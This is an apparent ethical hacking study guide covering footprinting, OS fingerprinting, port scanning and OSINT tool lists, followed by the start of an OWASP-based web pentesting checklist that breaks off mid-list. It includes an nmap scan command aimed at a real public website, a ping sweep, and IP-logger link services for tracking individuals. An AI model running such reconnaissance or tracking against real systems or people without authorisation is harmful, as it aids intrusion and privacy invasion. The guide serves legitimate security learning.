<h2 id="active-footprinting"><a class="header" href="#active-footprinting">Active Footprinting</a></h2>
<p>Active footprinting involves direct interaction with the target machine.</p>
<h2 id="passive-footprinting"><a class="header" href="#passive-footprinting">Passive Footprinting</a></h2>
<p>Passive footprinting involves collecting information about a system located remotely from the attacker.</p>
<h3 id="information-gathered-through-footprinting"><a class="header" href="#information-gathered-through-footprinting">Information Gathered Through Footprinting</a></h3>
<ul>
<li>The operating system of the target machine</li>
<li>Firewall information</li>
<li>IP address</li>
<li>Network map</li>
<li>Security configurations of the target machine</li>
<li>Email IDs and passwords</li>
<li>Server configurations</li>
<li>URLs</li>
<li>VPN details</li>
</ul>
<h3 id="sources-for-footprinting"><a class="header" href="#sources-for-footprinting">Sources for Footprinting</a></h3>
<ol>
<li>
<p><strong>Social Media</strong>: Hackers leverage the tendency of many individuals to share sensitive information online. They may create fake accounts to befriend or follow someone to gather their information.</p>
</li>
<li>
<p><strong>JOB Websites</strong>: Organizations often share confidential data on job websites. For example, a job posting mentioning "Job Opening for Lighttpd 2.0 Server Administrator" reveals that an organization uses the Lighttpd web server version 2.0.</p>
</li>
<li>
<p><strong>Google</strong>: Search engines like Google can be used for advanced searches, known as "Google hacking." Operators like "inurl," "allinurl," and "filetype" combined with basic search techniques can reveal sensitive information. For example, searching "inurl:ViewerFrame?Mode=" can find public web cameras.</p>
</li>
<li>
<p><strong>Social Engineering</strong>: Various techniques fall under this category, including eavesdropping and shoulder surfing, where attackers attempt to record personal information through communication mediums.</p>
</li>
<li>
<p><strong>Archive.org</strong>: This website collects snapshots of older website versions, providing information that may no longer exist on the current site.</p>
</li>
<li>
<p><strong>Organization's Website</strong>: The organization's website is a prime source for open-source information provided to clients, customers, or the public.</p>
</li>
<li>
<p><strong>Using Neo Trace</strong>: NeoTrace is a powerful tool for tracing network paths. It displays the route between the user and the remote site, including intermediate nodes and their information.</p>
</li>
<li>
<p><strong>Whois</strong>: This website allows hackers to trace information about domain names, email IDs, domain owners, and more, serving as a valuable tool for website footprinting.</p>
</li>
</ol>
<p>By understanding these techniques and sources, individuals can enhance their knowledge of footprinting in cybersecurity.</p>
<p><img src="https://github.com/masshuvo/full_ceh_guide/assets/108648096/309fc493-67fc-47fa-85e6-727ff407e55d" alt="images (2)" /></p>
<h1 id="fingerprinting-in-ethical-hacking"><a class="header" href="#fingerprinting-in-ethical-hacking">Fingerprinting in Ethical Hacking</a></h1>
<p>Fingerprinting refers to the methods used in ethical hacking to determine the operating system running on a remote computer. There are two main types of fingerprinting:</p>
<h2 id="active-fingerprinting"><a class="header" href="#active-fingerprinting">Active Fingerprinting</a></h2>
<p>Active fingerprinting involves sending specially crafted packets to a target machine and analyzing its response to determine the target's operating system. Tools like NMAP can be used for this purpose.</p>
<h2 id="passive-fingerprinting"><a class="header" href="#passive-fingerprinting">Passive Fingerprinting</a></h2>
<p>Passive fingerprinting relies on sniffer traces from the remote system, such as Wireshark data. By analyzing these traces, you can deduce the operating system of the remote host.</p>
<h3 id="factors-analyzed-for-os-determination"><a class="header" href="#factors-analyzed-for-os-determination">Factors Analyzed for OS Determination</a></h3>
<p>To determine the operating system, four important elements are examined:</p>
<ul>
<li>TTL (Time-To-Live) set on outbound packets</li>
<li>Window Size</li>
<li>DF (Don't Fragment) bit</li>
<li>TOS (Type of Service) settings</li>
</ul>
<p>These factors help in OS identification, although it's not always 100% accurate and may work better for some operating systems than others.</p>
<h3 id="basic-steps"><a class="header" href="#basic-steps">Basic Steps</a></h3>
<p>Before attacking a system, it's crucial to determine the target's operating system. Once known, it's easier to identify potential vulnerabilities for exploitation.</p>
<p>Here's a simple NMAP command to identify the OS and open ports of a website:</p>
<pre><code class="language-shell">nmap -O -v tutorialspoint.com
</code></pre>
<h1 id="port-scanning"><a class="header" href="#port-scanning">Port Scanning</a></h1>
<p>Port scanning reveals open ports on a server. For example:</p>
<p>PORT      STATE   SERVICE
22/tcp    open    ssh
80/tcp    open    http
443/tcp   open    https
3306/tcp  open    mysql</p>
<p>Ping Sweep
A ping sweep (ICMP sweep) helps find live hosts in a range of IP addresses. For example, using fping:</p>
<pre><code class="language-shell">fping -a -g 192.168.0.1 192.168.0.255
</code></pre>
<h1 id="dns-enumeration"><a class="header" href="#dns-enumeration">DNS Enumeration</a></h1>
<p>DNS enumeration gathers information about DNS servers and their records. Tools like nslookup and scripts like DNSenum.pl can assist in this process.</p>
<p>Quick fixes and precautions are also discussed to safeguard systems against potential attacks.</p>
<p>These techniques and tools are essential in ethical hacking to gather information about target systems and enhance security.</p>
<h1 id="ip-track"><a class="header" href="#ip-track">IP Track</a></h1>
<h2 id="ip-logger-"><a class="header" href="#ip-logger-">IP Logger:-</a></h2>
<ul>
<li>https://iplogger.org/</li>
<li>https://grabify.link/</li>
</ul>
<h2 id="ip-locator-"><a class="header" href="#ip-locator-">IP Locator:-</a></h2>
<ul>
<li>https://www.iplocation.net/</li>
</ul>
<h2 id="google-maplocation-track"><a class="header" href="#google-maplocation-track">Google Map(Location Track)</a></h2>
<p>Latitude &amp; Longitude in Google Maps</p>
<ul>
<li>https://www.google.com/maps</li>
</ul>
<h1 id="domain-website-info--part-1"><a class="header" href="#domain-website-info--part-1">Domain (Website Info) &gt;&gt; Part-1</a></h1>
<ul>
<li><a href="https://whois.domaintools.com/">https://whois.domaintools.com/</a></li>
<li><a href="https://domainbigdata.com/">https://domainbigdata.com/</a></li>
</ul>
<p><strong>DNS:</strong></p>
<ul>
<li><a href="https://smallseotools.com/domain-ip-lookup/">https://smallseotools.com/domain-ip-lookup/</a></li>
<li><a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></li>
<li><a href="https://www.ultratools.com/tools/dnsLookup">https://www.ultratools.com/tools/dnsLookup</a></li>
<li><a href="https://dnschecker.org/ns-lookup.php">https://dnschecker.org/ns-lookup.php</a></li>
</ul>
<p><strong>Site Hosting Company Info:</strong></p>
<ul>
<li><a href="https://smallseotools.com/domain-hosting-checker/">https://smallseotools.com/domain-hosting-checker/</a></li>
<li><a href="https://hostingchecker.com">https://hostingchecker.com</a></li>
</ul>
<h1 id="domain-website-info--part-2"><a class="header" href="#domain-website-info--part-2">Domain (Website Info) &gt;&gt; Part-2</a></h1>
<p>❑ Reverse Ip</p>
<ul>
<li><a href="https://www.yougetsignal.com/tools/web-sites-on-web-server/">https://www.yougetsignal.com/tools/web-sites-on-web-server/</a></li>
<li><a href="https://hackertarget.com/reverse-ip-lookup/">https://hackertarget.com/reverse-ip-lookup/</a></li>
<li><a href="https://www.whoishostingthis.com/">https://www.whoishostingthis.com/</a></li>
<li><a href="https://smallseotools.com/reverse-ip-lookup/">https://smallseotools.com/reverse-ip-lookup/</a></li>
</ul>
<h1 id="which-platform-used-for-developing-ping-to-identify-server-details-cms-check"><a class="header" href="#which-platform-used-for-developing-ping-to-identify-server-details-cms-check">Which platform used for developing Ping to identify server details (CMS Check)</a></h1>
<p>❑ CMS Check</p>
<ul>
<li>https://whatcms.org/</li>
<li>https://cmsdetect.com/</li>
<li>https://www.wpthemedetector.com/</li>
</ul>
<h2 id="chrome-extension"><a class="header" href="#chrome-extension">Chrome Extension</a></h2>
<ul>
<li>https://chrome.google.com/webstore/detail/what-cms-is-this/gamohlpmdjkdjepgdgjohkbfpmeelmem</li>
<li>https://chrome.google.com/webstore/detail/wappalyzer/gppongmhjkpfnbhagpmjfkannfbllamg?hl=en</li>
</ul>
<h1 id="which-platform-used-for-developing-ping-to-identify-server-details-site-builtwith-chrome-extension-whatruns"><a class="header" href="#which-platform-used-for-developing-ping-to-identify-server-details-site-builtwith-chrome-extension-whatruns">Which platform used for developing Ping to identify server details (Site BuiltWith) Chrome Extension WhatRuns</a></h1>
<ul>
<li>https://chrome.google.com/webstore/detail/whatruns/cmkdbmfndkfgebldhnkbfhlneefdaaip?hl=enBuiltWith</li>
</ul>
<h2 id="online-tools"><a class="header" href="#online-tools">Online Tools</a></h2>
<ul>
<li>https://builtwith.com/</li>
<li>https://sitereport.netcraft.com/</li>
<li>https://w3techs.com/site</li>
</ul>
<h1 id="extra-site-info"><a class="header" href="#extra-site-info">Extra Site Info</a></h1>
<p>Domain Country Checker Alexa, Country Flag Etc Browser Extension</p>
<h2 id="domain-age-checker"><a class="header" href="#domain-age-checker">Domain Age Checker</a></h2>
<ul>
<li>https://www.duplichecker.com/domain-age-checker.php
<h2 id="ssl-checker"><a class="header" href="#ssl-checker">SSL Checker</a></h2>
</li>
<li>https://www.digicert.com/help/</li>
</ul>
<h2 id="check-server-status"><a class="header" href="#check-server-status">Check Server Status</a></h2>
<ul>
<li>https://smallseotools.com/check-server-status/</li>
</ul>
<h2 id="website-speed-checker"><a class="header" href="#website-speed-checker">Website Speed Checker</a></h2>
<ul>
<li>https://tools.pingdom.com/</li>
<li>https://gtmetrix.com/</li>
</ul>
<h2 id="website-link-counter-checker"><a class="header" href="#website-link-counter-checker">WEBSITE LINK COUNTER CHECKER</a></h2>
<ul>
<li>https://smallseotools.com/website-links-count-checker/</li>
</ul>
<h1 id="email-header"><a class="header" href="#email-header">Email Header</a></h1>
<h2 id="online-tools-1"><a class="header" href="#online-tools-1">Online Tools</a></h2>
<ul>
<li>https://mxtoolbox.com/EmailHeaders.aspx</li>
<li>https://www.whatismyip.com/email-header-analyzer/</li>
<li>https://chrome.google.com/webstore/detail/email-tracker-for-gmail-m/ndnaehgpjlnokgebbaldlmgkapkpjkkb</li>
</ul>
<h1 id="valid-email-address-checker"><a class="header" href="#valid-email-address-checker">Valid Email Address Checker</a></h1>
<h2 id="online-valid-mail-checker"><a class="header" href="#online-valid-mail-checker">Online Valid Mail Checker</a></h2>
<ul>
<li>https://quickemailverification.com/</li>
<li>https://network-tools.com/</li>
</ul>
<h1 id="valid-mail-verifier-tool"><a class="header" href="#valid-mail-verifier-tool">Valid Mail Verifier Tool</a></h1>
<p>To check mail address valid or invalid</p>
<h1 id="ip-locator-best-one"><a class="header" href="#ip-locator-best-one">IP Locator Best One</a></h1>
<ul>
<li>https://ipinfo.io</li>
</ul>
<h1 id="data-breach-checker"><a class="header" href="#data-breach-checker">Data Breach Checker</a></h1>
<ul>
<li>https://breachdirectory.org/</li>
<li>https://haveibeenpwned.com/</li>
</ul>
<h1 id="epieos-tools-email-recon"><a class="header" href="#epieos-tools-email-recon">epieos Tools |Email Recon</a></h1>
<h2 id="epieos-tools---email-checking-tool---leaks-google-profiles--osint-recon"><a class="header" href="#epieos-tools---email-checking-tool---leaks-google-profiles--osint-recon">epieos Tools - Email Checking Tool - Leaks, Google Profiles | OSINT Recon</a></h2>
<ul>
<li>https://tools.epieos.com/</li>
</ul>
<h1 id="subdomain-enumeration-suite"><a class="header" href="#subdomain-enumeration-suite">Subdomain Enumeration Suite</a></h1>
<p>❑ Sub3 Suite is a research-grade suite of tools for Subdomain Enumeration, OSINT
Information gathering &amp; Attack Surface Mapping. Supports both manual and automated
analysis on variety of target types with many available features &amp; tools.
❑ Github: 3nock/sub3suite: a free, open source, cross platform Intelligence
gathering tool. (github.com)</p>
<h1 id="osint-sites-list"><a class="header" href="#osint-sites-list">OSINT Sites List</a></h1>
<ul>
<li><a href="https://start.me/p/b5Aow7/asint_collection">Biggest OSINT Sites List</a></li>
</ul>
<h1 id="recon"><a class="header" href="#recon">Recon</a></h1>
<ul>
<li><a href="https://github.com/Teammatrixx/Reconator">GitHub: Reconator</a></li>
</ul>
<h1 id="tryhackme-room"><a class="header" href="#tryhackme-room">TryHackMe Room</a></h1>
<ul>
<li><a href="https://tryhackme.com/room/threatinteltools">https://tryhackme.com/room/threatinteltools</a></li>
</ul>
<h1 id="theory"><a class="header" href="#theory">Theory</a></h1>
<ul>
<li><a href="https://tryhackme.com/room/geolocatingimages">https://tryhackme.com/room/geolocatingimages</a></li>
<li><a href="https://tryhackme.com/room/ohsint">https://tryhackme.com/room/ohsint</a></li>
<li><a href="https://tryhackme.com/room/searchlightosint">https://tryhackme.com/room/searchlightosint</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="web-application-pentesting-checklist"><a class="header" href="#web-application-pentesting-checklist">WEB APPLICATION PENTESTING CHECKLIST</a></h1>
<p><strong>OWASP Based Checklist  🌟🌟</strong></p>
<p><strong>500+ Test Cases 🚀🚀</strong></p>
<p>Notion link: https://hariprasaanth.notion.site/WEB-APPLICATION-PENTESTING-CHECKLIST-0f02d8074b9d4af7b12b8da2d46ac998
</br></br></p>
<ul>
<li>
<p><strong>INFORMATION GATHERING</strong></p>
<p><strong>Open Source Reconnaissance</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Perform Google Dorks search</li>
<li><input disabled="" type="checkbox"/>
Perform OSINT</li>
</ul>
<p><strong>Fingerprinting Web Server</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Find the type of Web Server</li>
<li><input disabled="" type="checkbox"/>
Find the version details of the Web Server</li>
</ul>
<p><strong>Looking For Metafiles</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
View the Robots.txt file</li>
<li><input disabled="" type="checkbox"/>
View the Sitemap.xml file</li>
<li><input disabled="" type="checkbox"/>
View the Humans.txt file</li>
<li><input disabled="" type="checkbox"/>
View the Security.txt file</li>
</ul>
<p><strong>Enumerating Web Server’s Applications</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Enumerating with Nmap</li>
<li><input disabled="" type="checkbox"/>
Enumerating with Netcat</li>
<li><input disabled="" type="checkbox"/>
Perform a DNS lookup</li>
<li><input disabled="" type="checkbox"/>
Perform a Reverse DNS lookup</li>
</ul>
<p><strong>Review The Web Contents</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Inspect the page source for sensitive info</li>
<li><input disabled="" type="checkbox"/>
Try to find Sensitive Javascript codes</li>
<li><input disabled="" type="checkbox"/>
Try to find any keys</li>
<li><input disabled="" type="checkbox"/>
Make sure the autocomplete is disabled</li>
</ul>
<p><strong>Identifying Application’s Entry Points</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Identify what the methods used are?</li>
<li><input disabled="" type="checkbox"/>
Identify where the methods used are?</li>
<li><input disabled="" type="checkbox"/>
Identify the Injection point</li>
</ul>
<p><strong>Mapping Execution Paths</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Use Burp Suite</li>
<li><input disabled="" type="checkbox"/>
Use Dirsearch</li>
<li><input disabled="" type="checkbox"/>
Use Gobuster</li>
</ul>
<p><strong>Fingerprint Web Application Framework</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Use the Wappalyzer browser extension</li>
<li><input disabled="" type="checkbox"/>
Use Whatweb</li>
<li><input disabled="" type="checkbox"/>
View URL extensions</li>
<li><input disabled="" type="checkbox"/>
View HTML source code</li>
<li><input disabled="" type="checkbox"/>
View the cookie parameter</li>
<li><input disabled="" type="checkbox"/>
View the HTTP headers</li>
</ul>
<p><strong>Map Application Architecture</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Map the overall site structure</li>
</ul>
</li>
<li>
<p><strong>CONFIGURATION &amp; DEPLOYMENT MANAGEMENT TESTING</strong></p>
<p><strong>Test Network Configuration</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Check the network configuration</li>
<li><input disabled="" type="checkbox"/>
Check for default settings</li>
<li><input disabled="" type="checkbox"/>
Check for default credentials</li>
</ul>
<p><strong>Test Application Configuration</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Ensure only required modules are used</li>
<li><input disabled="" type="checkbox"/>
Ensure unwanted modules are disabled</li>
<li><input disabled="" type="checkbox"/>
Ensure the server can handle DOS</li>
<li><input disabled="" type="checkbox"/>
Check how the application is handling 4xx &amp; 5xx errors</li>
<li><input disabled="" type="checkbox"/>
Check for the privilege required to run</li>
<li><input disabled="" type="checkbox"/>
Check logs for sensitive info</li>
</ul>
<p><strong>Test File Extension Handling</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Ensure the server won’t return sensitive extensions</li>
<li><input disabled="" type="checkbox"/>
Ensure the server won’t accept malicious extensions</li>
<li><input disabled="" type="checkbox"/>
Test for file upload vulnerabilities</li>
</ul>
<p><strong>Review Backup &amp; Unreferenced Files</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Ensure unreferenced files don’t contain any sensitive info</li>
<li><input disabled="" type="checkbox"/>
Ensure the namings of old and new backup files</li>
<li><input disabled="" type="checkbox"/>
Check the functionality of unreferenced pages</li>
</ul>
<p><strong>Enumerate Infrastructure &amp; Admin Interfaces</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Try to find the Infrastructure Interface</li>
<li><input disabled="" type="checkbox"/>
Try to find the Admin Interface</li>
<li><input disabled="" type="checkbox"/>
Identify the hidden admin functionalities</li>
</ul>
<p><strong>Testing HTTP Methods</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Discover the supported methods</li>
<li><input disabled="" type="checkbox"/>
Ensure the PUT method is disabled</li>
<li><input disabled="" type="checkbox"/>
Ensure the OPTIONS method is disabled</li>
<li><input disabled="" type="checkbox"/>
Test access control bypass</li>
<li><input disabled="" type="checkbox"/>
Test for XST attacks</li>
<li><input disabled="" type="checkbox"/>
Test for HTTP method overriding</li>
</ul>
<p><strong>Test HSTS</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Ensure HSTS is enabled</li>
</ul>
<p><strong>Test RIA Cross Domain Policy</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Check for Adobe’s Cross Domain Policy</li>
<li><input disabled="" type="checkbox"/>
Ensure it has the least privilege</li>
</ul>
<p><strong>Test File Permission</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Ensure the permissions for sensitive files</li>
<li><input disabled="" type="checkbox"/>
Test for directory enumeration</li>
</ul>
<p><strong>Test For Subdomain Takeover</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Test DNS, A, and CNAME records for subdomain takeover</li>
<li><input disabled="" type="checkbox"/>
Test NS records for subdomain takeover</li>
<li><input disabled="" type="checkbox"/>
Test 404 response for subdomain takeover</li>
</ul>
<p><strong>Test Cloud Storage</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Check the sensitive paths of AWS</li>
<li><input disabled="" type="checkbox"/>
Check the sensitive paths of Google Cloud</li>
<li><input disabled="" type="checkbox"/>
Check the sensitive paths of Azure</li>
</ul>
</li>
<li>
<p><strong>IDENTITY MANAGEMENT TESTING</strong></p>
<p><strong>Test Role Definitions</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Test for forced browsing</li>
<li><input disabled="" type="checkbox"/>
Test for IDOR (Insecure Direct Object Reference)</li>
<li><input disabled="" type="checkbox"/>
Test for parameter tampering</li>
<li><input disabled="" type="checkbox"/>
Ensure low privilege users can’t able to access high privilege resources</li>
</ul>
<p><strong>Test User Registration Process</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Ensure the same user or identity can’t register again and again</li>
<li><input disabled="" type="checkbox"/>
Ensure the registrations are verified</li>
<li><input disabled="" type="checkbox"/>
Ensure disposable email addresses are rejected</li>
<li><input disabled="" type="checkbox"/>
Check what proof is required for successful registration</li>
</ul>
<p><strong>Test Account Provisioning Process</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Check the verification for the provisioning process</li>
<li><input disabled="" type="checkbox"/>
Check the verification for the de-provisioning process</li>
<li><input disabled="" type="checkbox"/>
Check the provisioning rights for an admin user to other users</li>
<li><input disabled="" type="checkbox"/>
Check whether a user is able to de-provision themself or not?</li>
<li><input disabled="" type="checkbox"/>
Check for the resources of a de-provisioned user</li>
</ul>
<p><strong>Testing For Account Enumeration</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Check the response when a valid username and password entered</li>
<li><input disabled="" type="checkbox"/>
Check the response when a valid username and an invalid password entered</li>
<li><input disabled="" type="checkbox"/>
Check the response when an invalid username and password entered</li>
<li><input disabled="" type="checkbox"/>
Ensure the rate-limiting functionality is enabled in username and password fields</li>
</ul>
<p><strong>Test For Weak Username Policy</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Check the response for both valid and invalid usernames</li>
<li><input disabled="" type="checkbox"/>
Check for username enumeration</li>
</ul>
</li>
<li>
<p><strong>AUTHENTICATION TESTING</strong></p>
<p><strong>Test For Un-Encrypted Channel</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Check for the HTTP login page</li>
<li><input disabled="" type="checkbox"/>
Check for the HTTP register or sign-in page</li>
<li><input disabled="" type="checkbox"/>
Check for HTTP forgot password page</li>
<li><input disabled="" type="checkbox"/>
Check for HTTP change password</li>
<li><input disabled="" type="checkbox"/>
Check for resources on HTTP after logout</li>
<li><input disabled="" type="checkbox"/>
Test for forced browsing to HTTP pages</li>
</ul>
<p><strong>Test For Default Credentials</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Test with default credentials</li>
<li><input disabled="" type="checkbox"/>
Test organization name as credentials</li>
<li><input disabled="" type="checkbox"/>
Test for response manipulation</li>
<li><input disabled="" type="checkbox"/>
Test for the default username and a blank password</li>
<li><input disabled="" type="checkbox"/>
Review the page source for credentials</li>
</ul>
<p><strong>Test For Weak Lockout Mechanism</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Ensure the account has been locked after 3-5 incorrect attempts</li>
<li><input disabled="" type="checkbox"/>
Ensure the system accepts only the valid CAPTCHA</li>
<li><input disabled="" type="checkbox"/>
Ensure the system rejects the invalid CAPTCHA</li>
<li><input disabled="" type="checkbox"/>
Ensure CAPTCHA code regenerated after reloaded</li>
<li><input disabled="" type="checkbox"/>
Ensure CAPTCHA reloads after entering the wrong code</li>
<li><input disabled="" type="checkbox"/>
Ensure the user has a recovery option for a lockout account</li>
</ul>
<p><strong>Test For Bypassing Authentication Schema</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Test forced browsing directly to the internal dashboard without login</li>
<li><input disabled="" type="checkbox"/>
Test for session ID prediction</li>
<li><input disabled="" type="checkbox"/>
Test for authentication parameter tampering</li>
<li><input disabled="" type="checkbox"/>
Test for SQL injection on the login page</li>
<li><input disabled="" type="checkbox"/>
Test to gain access with the help of session ID</li>
<li><input disabled="" type="checkbox"/>
Test multiple logins allowed or not?</li>
</ul>
<p><strong>Test For Vulnerable Remember Password</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Ensure that the stored password is encrypted</li>
<li><input disabled="" type="checkbox"/>
Ensure that the stored password is on the server-side</li>
</ul>
<p><strong>Test For Browser Cache Weakness</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Ensure proper cache-control is set on sensitive pages</li>
<li><input disabled="" type="checkbox"/>
Ensure no sensitive data is stored in the browser cache storage</li>
</ul>
<p><strong>Test For Weak Password Policy</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Ensure the password policy is set to strong</li>
<li><input disabled="" type="checkbox"/>
Check for password reusability</li>
<li><input disabled="" type="checkbox"/>
Check the user is prevented to use his username as a password</li>
<li><input disabled="" type="checkbox"/>
Check for the usage of common weak passwords</li>
<li><input disabled="" type="checkbox"/>
Check the minimum password length to be set</li>
<li><input disabled="" type="checkbox"/>
Check the maximum password length to be set</li>
</ul>
<p><strong>Testing For Weak Security Questions</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Check for the complexity of the questions</li>
<li><input disabled="" type="checkbox"/>
Check for brute-forcing</li>
</ul>
<p><strong>Test For Weak Password Reset Function</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Check what information is required to reset the password</li>
<li><input disabled="" type="checkbox"/>
Check for password reset function with HTTP</li>
<li><input disabled="" type="checkbox"/>
Test the randomness of the password reset tokens</li>
<li><input disabled="" type="checkbox"/>
Test the uniqueness of the password reset tokens</li>
<li><input disabled="" type="checkbox"/>
Test for rate limiting on password reset tokens</li>
<li><input disabled="" type="checkbox"/>
Ensure the token must expire after being used</li>
<li><input disabled="" type="checkbox"/>
Ensure the token must expire after not being used for a long time</li>
</ul>
<p><strong>Test For Weak Password Change Function</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Check if the old password asked to make a change</li>
<li><input disabled="" type="checkbox"/>
Check for the uniqueness of the forgotten password</li>
<li><input disabled="" type="checkbox"/>
Check for blank password change</li>
<li><input disabled="" type="checkbox"/>
Check for password change function with HTTP</li>
<li><input disabled="" type="checkbox"/>
Ensure the old password is not displayed after changed</li>
<li><input disabled="" type="checkbox"/>
Ensure the other sessions got destroyed after the password change</li>
</ul>
<p><strong>Test For Weak Authentication In Alternative Channel</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Test authentication on the desktop browsers</li>
<li><input disabled="" type="checkbox"/>
Test authentication on the mobile browsers</li>
<li><input disabled="" type="checkbox"/>
Test authentication in a different country</li>
<li><input disabled="" type="checkbox"/>
Test authentication in a different language</li>
<li><input disabled="" type="checkbox"/>
Test authentication on desktop applications</li>
<li><input disabled="" type="checkbox"/>
Test authentication on mobile applications</li>
</ul>
</li>
<li>
<p><strong>AUTHORIZATION TESTING</strong></p>
<p><strong>Testing Directory Traversal File Include</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Identify the injection point on the URL</li>
<li><input disabled="" type="checkbox"/>
Test for Local File Inclusion</li>
<li><input disabled="" type="checkbox"/>
Test for Remote File Inclusion</li>
<li><input disabled="" type="checkbox"/>
Test Traversal on the URL parameter</li>
<li><input disabled="" type="checkbox"/>
Test Traversal on the cookie parameter</li>
</ul>
<p><strong>Testing Traversal With Encoding</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Test Traversal with Base64 encoding</li>
<li><input disabled="" type="checkbox"/>
Test Traversal with URL encoding</li>
<li><input disabled="" type="checkbox"/>
Test Traversal with ASCII encoding</li>
<li><input disabled="" type="checkbox"/>
Test Traversal with HTML encoding</li>
<li><input disabled="" type="checkbox"/>
Test Traversal with Hex encoding</li>
<li><input disabled="" type="checkbox"/>
Test Traversal with Binary encoding</li>
<li><input disabled="" type="checkbox"/>
Test Traversal with Octal encoding</li>
<li><input disabled="" type="checkbox"/>
Test Traversal with Gzip encoding</li>
</ul>
<p><strong>Testing Travesal With Different OS Schemes</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Test Traversal with Unix schemes</li>
<li><input disabled="" type="checkbox"/>
Test Traversal with Windows schemes</li>
<li><input disabled="" type="checkbox"/>
Test Traversal with Mac schemes</li>
</ul>
<p><strong>Test Other Encoding Techniques</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Test Traversal with Double encoding</li>
<li><input disabled="" type="checkbox"/>
Test Traversal with all characters encode</li>
<li><input disabled="" type="checkbox"/>
Test Traversal with only special characters encode</li>
</ul>
<p><strong>Test Authorization Schema Bypass</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Test for Horizontal authorization schema bypass</li>
<li><input disabled="" type="checkbox"/>
Test for Vertical authorization schema bypass</li>
<li><input disabled="" type="checkbox"/>
Test override the target with custom headers</li>
</ul>
<p><strong>Test For Privilege Escalation</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Identify the injection point</li>
<li><input disabled="" type="checkbox"/>
Test for bypassing the security measures</li>
<li><input disabled="" type="checkbox"/>
Test for forced browsing</li>
<li><input disabled="" type="checkbox"/>
Test for IDOR</li>
<li><input disabled="" type="checkbox"/>
Test for parameter tampering to high privileged user</li>
</ul>
<p><strong>Test For Insecure Direct Object Reference</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Test to change the ID parameter</li>
<li><input disabled="" type="checkbox"/>
Test to add parameters at the endpoints</li>
<li><input disabled="" type="checkbox"/>
Test for HTTP parameter pollution</li>
<li><input disabled="" type="checkbox"/>
Test by adding an extension at the end</li>
<li><input disabled="" type="checkbox"/>
Test with outdated API versions</li>
<li><input disabled="" type="checkbox"/>
Test by wrapping the ID with an array</li>
<li><input disabled="" type="checkbox"/>
Test by wrapping the ID with a JSON object</li>
<li><input disabled="" type="checkbox"/>
Test for JSON parameter pollution</li>
<li><input disabled="" type="checkbox"/>
Test by changing the case</li>
<li><input disabled="" type="checkbox"/>
Test for path traversal</li>
<li><input disabled="" type="checkbox"/>
Test by changing words</li>
<li><input disabled="" type="checkbox"/>
Test by changing methods</li>
</ul>
</li>
<li>
<p><strong>SESSION MANAGEMENT TESTING</strong></p>
<p><strong>Test For Session Management Schema</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Ensure all Set-Cookie directives are secure</li>
<li><input disabled="" type="checkbox"/>
Ensure no cookie operation takes place over an unencrypted channel</li>
<li><input disabled="" type="checkbox"/>
Ensure the cookie can’t be forced over an unencrypted channel</li>
<li><input disabled="" type="checkbox"/>
Ensure the HTTPOnly flag is enabled</li>
<li><input disabled="" type="checkbox"/>
Check if any cookies are persistent</li>
<li><input disabled="" type="checkbox"/>
Check for session cookies and cookie expiration date/time</li>
<li><input disabled="" type="checkbox"/>
Check for session fixation</li>
<li><input disabled="" type="checkbox"/>
Check for concurrent login</li>
<li><input disabled="" type="checkbox"/>
Check for session after logout</li>
<li><input disabled="" type="checkbox"/>
Check for session after closing the browser</li>
<li><input disabled="" type="checkbox"/>
Try decoding cookies (Base64, Hex, URL, etc)</li>
</ul>
<p><strong>Test For Cookie Attributes</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Ensure the cookie must be set with the secure attribute</li>
<li><input disabled="" type="checkbox"/>
Ensure the cookie must be set with the path attribute</li>
<li><input disabled="" type="checkbox"/>
Ensure the cookie must have the HTTPOnly flag</li>
</ul>
<p><strong>Test For Session Fixation</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Ensure new cookies have been issued upon a successful authentication</li>
<li><input disabled="" type="checkbox"/>
Test manipulating the cookies</li>
</ul>
<p><strong>Test For Exposed Session Variables</strong></p>
<ul>
<li><input disabled="" type="checkbox"/>
Test for encryption</li>
